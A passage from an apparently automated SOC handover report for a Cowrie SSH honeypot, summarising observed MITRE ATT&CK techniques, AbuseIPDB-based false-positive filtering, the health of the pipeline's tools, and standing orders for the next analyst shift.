| `187.115.144[.]103` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 25 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 13 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 7 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 3 |

---

## 🔕 False Positive Summary (9 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 47 cases |
| Tool 34  | Credential Extractor        | ✅ 20 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 34 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 9 filtered (19.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 28 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 7 priority case(s) shown individually · 25 recon entry/entries in table (4 group(s) consolidating 10 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-21T15:56:58Z_
